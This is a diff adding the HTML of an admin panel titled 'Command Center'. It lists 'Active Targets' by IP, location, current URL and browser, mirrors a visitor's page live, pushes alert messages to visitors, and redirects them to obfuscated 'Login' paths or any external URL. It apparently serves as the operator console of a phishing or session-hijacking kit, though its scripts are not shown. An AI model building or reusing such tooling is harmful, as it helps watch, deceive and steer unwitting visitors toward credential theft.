@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <link rel="stylesheet" href="/css/admin.css">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Outfit:wght@400;600;700&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <div class="dashboard-container">
+        <header>
+            <div class="header-title">
+                <h1>Command Center</h1>
+                <div class="subtitle">Global Operations Dashboard</div>
+            </div>
+            <div class="header-stats">
+                <div class="stat-box">
+                    <span class="stat-label">Active Targets</span>
+                    <span class="stat-value" id="stat-active-count">0</span>
+                </div>
+                <div class="status-indicator">
+                    <span class="dot"></span>
+                    <span>Live Sync Active</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- Smart Toolbar -->
+        <div class="dashboard-toolbar">
+            <div class="search-box">
+                <svg style="width:18px;height:18px;color:var(--text-secondary);" fill="none" stroke="currentColor"
+                    viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                </svg>
+                <input type="text" id="target-search" placeholder="Search by IP, Location, or URL...">
+            </div>
+        </div>
+
+        <div class="table-container">
+            <table id="visitors-table">
+                <thead>
+                    <tr>
+                        <th>Connection</th>
+                        <th>Target ID</th>
+                        <th>IP Address</th>
+                        <th>Location Data</th>
+                        <th>Current URL</th>
+                        <th>System Agent</th>
+                        <th>Live Activity</th>
+                    </tr>
+                </thead>
+                <tbody id="visitors-body">
+                    <!-- Dynamic rows will be inserted here -->
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Live View Modal -->
+    <div id="live-view-modal" class="modal-overlay" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Live View: <span id="live-view-target"></span></h2>
+                <button id="close-live-view" class="close-btn">&times;</button>
+            </div>
+            <div class="modal-body">
+                <!-- Sandbox iframe to prevent CSS/JS bleeding and execution of tracked scripts -->
+                <iframe id="live-view-frame" sandbox="allow-same-origin"
+                    style="width: 100%; height: 60vh; border: none; background: white;"></iframe>
+            </div>
+        </div>
+    </div>
+
+    <!-- Alert Modal -->
+    <div id="alert-modal" class="modal-overlay" style="display: none;">
+        <div class="modal-content" style="max-width: 500px;">
+            <div class="modal-header">
+                <h2>Send Alert to <span id="alert-target-ip" style="color: var(--accent);"></span></h2>
+                <button onclick="document.getElementById('alert-modal').style.display='none'"
+                    class="close-btn">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p style="color: #cbd5e1; margin-top: 0; margin-bottom: 10px; font-size: 0.9rem;">Enter the message to
+                    display to the visitor:</p>
+                <input type="text" id="alert-message-input" autocomplete="off"
+                    style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--glass-border); background: rgba(15,23,42,0.6); color: white; font-family: 'Inter', sans-serif; margin-bottom: 20px;">
+                <button id="send-alert-btn" class="action-btn alert-btn"
+                    style="width: 100%; padding: 12px; font-size: 1rem;">Send Alert Broadcast</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Redirect Modal -->
+    <div id="redirect-modal" class="modal-overlay" style="display: none;">
+        <div class="modal-content" style="max-width: 500px;">
+            <div class="modal-header">
+                <h2>Suggest URL to <span id="redirect-target-ip" style="color: var(--accent);"></span></h2>
+                <button onclick="document.getElementById('redirect-modal').style.display='none'"
+                    class="close-btn">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p style="color: #cbd5e1; margin-top: 0; margin-bottom: 10px; font-size: 0.9rem;">Select an internal
+                    dashboard page:</p>
+                <select id="redirect-select"
+                    style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--glass-border); background: rgba(15,23,42,0.6); color: white; font-family: 'Inter', sans-serif; margin-bottom: 20px; outline: none; cursor: pointer;">
+                    <option value="/s7d56a7d5affa">Login</option>
+                    <option value="/s7d55a7d5grg">Test Page</option>
+                </select>
+
+                <p style="color: #cbd5e1; margin-bottom: 10px; font-size: 0.9rem;">Or enter a custom external URL:</p>
+                <input type="text" id="redirect-custom-input" placeholder="https://..." autocomplete="off"
+                    style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--glass-border); background: rgba(15,23,42,0.6); color: white; font-family: 'Inter', sans-serif; margin-bottom: 20px;">
+
+                <button id="send-redirect-btn" class="action-btn redirect-btn"
+                    style="width: 100%; padding: 12px; font-size: 1rem;">Trigger Redirection</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/admin.js"></script>
+</body>
+
+</html>
